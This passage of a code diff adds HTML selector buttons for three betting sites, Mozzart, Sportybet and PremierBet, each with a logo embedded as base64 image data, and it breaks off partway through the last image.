+                    <button class="site-btn" data-site="Mozzart"><img src="data:image/jpeg;base64,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" alt="Mozzart" style="height:32px;vertical-align:middle;"> Mozzart</button>
+                    <button class="site-btn" data-site="Sportybet"><img src="data:image/png;base64,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" alt="Sportybet" style="height:32px;vertical-align:middle;"> Sportybet</button>
+                    <button class="site-btn" data-site="PremierBet"><img src="data:image/jpeg;base64,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